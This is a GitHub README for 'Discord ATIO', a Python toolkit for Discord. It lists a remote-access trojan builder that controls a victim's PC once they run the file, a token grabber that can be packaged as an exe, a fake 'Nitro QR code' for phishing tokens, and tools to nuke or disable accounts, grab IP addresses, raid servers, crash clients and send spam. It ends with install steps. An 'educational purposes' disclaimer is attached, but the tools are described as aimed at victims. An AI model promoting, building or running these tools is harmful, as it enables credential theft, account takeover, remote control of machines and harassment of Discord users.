<p align="center">
  <img src="https://i.discord.fr/PSS.png">
</p>

<h1 align="center">[Discord] - ATIO (V1.3.0)</h1>
<h1 align="center">The project is no longer under active development and will not receive any further updates or bug fixes.</h1>
<p align="center">
  <a href="https://github.com/AstraaDev/Discord-All-Tools-In-One/blob/main/LICENSE">
    <img src="https://img.shields.io/badge/License-MIT-important">
  </a>
  <a href="https://www.python.org">
    <img src="https://img.shields.io/badge/Python-3.9-informational.svg">
  </a>
  <a href="https://github.com/AstraaDev/Discord-All-Tools-In-One">
    <img src="https://img.shields.io/badge/covarage-95%25-green">
  </a>
  <a href="https://github.com/AstraaDev">
    <img src="https://img.shields.io/github/repo-size/AstraaDev/Discord-All-Tools-In-One.svg?label=Repo%20size&style=flat-square">
  </a>
    <p align="center"> <a href="https://twitter.com/astraadev" target="blank">
    <img src="https://img.shields.io/twitter/follow/astraadev?logo=twitter&style=for-the-badge" alt="astraadev"/></a>
  </a>
</p>

<p align="center">
  [Discord] - ATIO is a Script Gathering for Windows/Linux systems written in Python.
</p>

## Disclaimer

|ATIO was made for Educational purposes|
|-------------------------------------------------|
This project was created only for good purposes and personal use.
By using ATIO, you agree that you hold responsibility and accountability of any consequences caused by your actions.

## Features
- [ ] - [Selft Bot](https://github.com/AstraaDev/Discord-All-Tools-In-One) - Turn your discord account into a self bot.
- [ ] - [RAT Tool](https://github.com/moom825/Discord-RAT) - Create a RAT file. Once the victim runs it, you can control his PC through a BOT Discord.
- [ ] - [Raid Tool](https://github.com/AstraaDev/Discord-All-Tools-In-One) - Allows to raid a discord server with several accounts (requires an account generator).
- [ ] - [Server Nuker](https://github.com/AstraaDev/Discord-All-Tools-In-One) - Easily nuke a discord server with a BOT Discord.
- [x] - [VideoCrash Maker](https://github.com/AstraaDev/Discord-VideoCrashMaker) - Convert a video into an identical video that makes Crash discord app when played.
- [x] - [File Grabber](https://github.com/AstraaDev/Discord-Token-Grabber) - Create a TokenGrabber.py file to get a user's token and allows you to convert it to an Exe.
- [ ] - [IP Grabber](https://github.com/AstraaDev/Discord-All-Tools-In-One) - Allows you to retrieve the IP of any person who is on a call with you.
- [ ] - [Token Qr Generator](https://github.com/AstraaDev/Discord-Qr-Code-Token) - Generate a "Fake Nitro QR Code". If a user scans it, you get his token.
- [x] - [Account Nuker](https://github.com/AstraaDev/Discord-All-Tools-In-One) - Quit the servers, Delete friends, Create serveurs, change the settings of a user with his Token.
- [x] - [Account Disabler](https://github.com/assaultfulgg/account-disabler) - Allows you to disable any discord account with the token of this one.
- [ ] - [Account Generator](https://github.com/AstraaDev/Discord-All-Tools-In-One) - Create a discord account valid every 1min30 and give you the associated token. 
- [x] - [Settings Cycler](https://github.com/AstraaDev/Discord-All-Tools-In-One) - Cycle theme color (Black/White), Language and Statue of a user with his Token.
- [x] - [Token Informations](https://github.com/AstraaDev/Discord-All-Tools-In-One) - Get all the information of a Discord User with his Token.
- [x] - [AutoLogin](https://github.com/AstraaDev/Discord-Token-AutoLogin) - Enter a user's token and automatically log in to the user's account.
- [x] - [Tokens Checker](https://github.com/AstraaDev/Discord-Token-AutoLogin) - Allows you to check the validity of a list of tokens quickly.
- [x] - [Clear DM](https://github.com/Da532/Clear) - Delete all your messages sent to a person in dm automatically.
- [x] - [HypeSquad House Changer](https://github.com/AstraaDev/Discord-All-Tools-In-One) - Select your HypeSquad House.
- [x] - [Server Lookup](https://github.com/AstraaDev/Discord-All-Tools-In-One) - Get all the information of a Discord Server with a Invite Link.
- [x] - [Mass DM](https://github.com/AstraaDev/Discord-All-Tools-In-One) - Allows to DM all friends of the person by sending them the same message.
- [x] - [Group SPammer](https://github.com/AstraaDev/Discord-All-Tools-In-One) - Allows you to spam the group creation and add users to it.
- [x] - [Nitro Generator](https://github.com/AstraaDev/Discord-All-Tools-In-One) - Generates and tests a Nitro code. If it works, you will be notified.
- [x] - [WebHooks Spammer](https://github.com/AstraaDev/Discord-All-Tools-In-One) - Spam the message you want through a WebHooks.
- [x] - [WebHooks Remover](https://github.com/AstraaDev/Discord-All-Tools-In-One) - Delete any WebHooks link.

## How To Install

#### 1st・Installation (Automated installation)
```
Launch the setup.bat file. A new file will be created. You will only have to launch it.
```

#### 2nd・Installation (Manual installation)
```
$ git clone https://github.com/AstraaDev/Discord-All-Tools-In-One.git
$ python -m pip install -r requirements.txt
$ python3 atio.py
```

## Additional Informations
General Informations:
- If you have a problem, [CLICK HERE](https://www.youtube.com/watch?v=o-YBDTqX_ZU) to watch the YouTube video.
- Find your output files in the  [output](/output) folder.
- If you find any malfunction, contact me on Discord: None.

## Example
![home.png](https://cdn.discordapp.com/attachments/1033450243481677874/1149718136258576466/image.png)

## Errors/Fixes

pyinstaller is not recognized as an external command
> open a cmd and type `pip install pyinstaller` or make sure [python](https://www.python.org/downloads/) is added to [PATH](https://datatofish.com/add-python-to-windows-path/)

> You probably have python 3.10 which has some new shit so downgrade to [python 3.9](https://www.python.org/downloads/release/python-397/)
